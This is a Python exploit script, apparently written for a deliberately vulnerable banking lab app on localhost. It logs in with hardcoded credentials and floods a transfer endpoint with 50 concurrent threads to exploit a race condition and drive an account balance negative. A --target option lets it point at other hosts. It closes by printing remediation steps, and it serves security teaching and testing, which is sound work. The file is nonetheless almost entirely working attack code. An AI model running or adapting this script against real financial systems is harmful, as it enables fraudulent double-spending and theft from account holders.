#!/usr/bin/env python3
"""
Race Condition Exploit - Vulnerable Bank
=========================================
This script exploits the race condition in money transfer to create negative balance.

CVSS Score: 9.1 (Critical)
CWE: CWE-362
"""

import requests
import threading
import time
import sys

# Target configuration
TARGET_URL = "http://localhost:8080"
LOGIN_ENDPOINT = f"{TARGET_URL}/login"
TRANSFER_ENDPOINT = f"{TARGET_URL}/transfer"
DASHBOARD_ENDPOINT = f"{TARGET_URL}/dashboard"

# Attack configuration
USERNAME = "charlie"
PASSWORD = "password123"
TARGET_ACCOUNT = "1000000003"  # Alice's account
TRANSFER_AMOUNT = 100.00
NUM_THREADS = 50

def print_banner():
    print("=" * 60)
    print("Race Condition Exploit - Vulnerable Bank")
    print("=" * 60)
    print()

def login(session):
    """Login and return session"""
    data = {
        'username': USERNAME,
        'password': PASSWORD
    }

    response = session.post(LOGIN_ENDPOINT, data=data)

    if response.status_code == 200:
        return True
    return False

def get_balance(session):
    """Get current balance from dashboard"""
    response = session.get(DASHBOARD_ENDPOINT)

    # Parse balance from response (simple string search)
    if '₴' in response.text:
        try:
            # Find balance in HTML
            import re
            match = re.search(r'₴([\d,]+\.\d{2})', response.text)
            if match:
                balance_str = match.group(1).replace(',', '')
                return float(balance_str)
        except:
            pass

    return None

def perform_transfer(session, amount, description="Race condition test"):
    """Perform a single transfer"""
    data = {
        'to_account': TARGET_ACCOUNT,
        'amount': str(amount),
        'description': description
    }

    try:
        response = session.post(TRANSFER_ENDPOINT, data=data, timeout=5)
        return response.status_code
    except:
        return None

def main():
    print_banner()

    if len(sys.argv) > 1 and sys.argv[1] == '--target':
        global TARGET_URL, LOGIN_ENDPOINT, TRANSFER_ENDPOINT, DASHBOARD_ENDPOINT
        TARGET_URL = sys.argv[2]
        LOGIN_ENDPOINT = f"{TARGET_URL}/login"
        TRANSFER_ENDPOINT = f"{TARGET_URL}/transfer"
        DASHBOARD_ENDPOINT = f"{TARGET_URL}/dashboard"

    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Username: {USERNAME}")
    print(f"[*] Transfer Amount: ${TRANSFER_AMOUNT}")
    print(f"[*] Number of Threads: {NUM_THREADS}")
    print(f"[*] Total Attempted Transfer: ${TRANSFER_AMOUNT * NUM_THREADS}")
    print()

    # Create session and login
    print("[*] Logging in...")
    session = requests.Session()

    if not login(session):
        print("[-] Login failed!")
        return

    print("[+] Login successful!")

    # Get initial balance
    print("[*] Checking initial balance...")
    initial_balance = get_balance(session)

    if initial_balance is not None:
        print(f"[+] Initial Balance: ${initial_balance:.2f}")
    else:
        print("[!] Could not retrieve initial balance")
        initial_balance = 0

    expected_transfer = TRANSFER_AMOUNT * NUM_THREADS
    print(f"[*] Expected final balance if race condition fails: ${initial_balance - expected_transfer:.2f}")
    print(f"[*] Expected final balance if race condition succeeds: NEGATIVE or less than expected")

    input("\n[!] Press ENTER to start the race condition attack...")

    # Perform concurrent transfers
    print(f"\n[*] Launching {NUM_THREADS} concurrent transfer requests...")

    threads = []
    results = []

    start_time = time.time()

    for i in range(NUM_THREADS):
        t = threading.Thread(target=lambda: results.append(perform_transfer(session, TRANSFER_AMOUNT)))
        threads.append(t)
        t.start()

    # Wait for all threads to complete
    for t in threads:
        t.join()

    elapsed_time = time.time() - start_time

    print(f"[+] All requests completed in {elapsed_time:.2f} seconds")
    print(f"[+] Successful responses: {results.count(200)}/{NUM_THREADS}")

    # Check final balance
    time.sleep(2)  # Wait for database to update

    print("\n[*] Checking final balance...")
    final_balance = get_balance(session)

    if final_balance is not None:
        print(f"[+] Final Balance: ${final_balance:.2f}")

        balance_difference = initial_balance - final_balance
        print(f"[+] Balance Difference: ${balance_difference:.2f}")

        if balance_difference > expected_transfer:
            print("\n[!] RACE CONDITION DETECTED!")
            print(f"[!] Expected to transfer ${expected_transfer:.2f}")
            print(f"[!] Actually transferred ${balance_difference:.2f}")
            print(f"[!] Extra funds transferred: ${balance_difference - expected_transfer:.2f}")
        elif final_balance < 0:
            print("\n[+] SUCCESS! Negative balance achieved!")
            print(f"[+] Balance went negative: ${final_balance:.2f}")
        elif balance_difference < expected_transfer:
            print("\n[+] RACE CONDITION EXPLOITED!")
            print(f"[+] Some transfers were allowed despite insufficient funds")
        else:
            print("\n[-] Race condition may not have been exploited")
            print("[!] Try increasing NUM_THREADS or decreasing TRANSFER_AMOUNT")
    else:
        print("[!] Could not retrieve final balance")

    print("\n" + "=" * 60)
    print("[*] Attack completed!")
    print("=" * 60)
    print("\n[!] Remediation:")
    print("  1. Implement database row-level locking (SELECT ... FOR UPDATE)")
    print("  2. Use atomic transactions")
    print("  3. Implement proper balance validation within transaction")
    print("  4. Add transaction queue with single-threaded processing")
    print("  5. Implement optimistic locking with version numbers")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
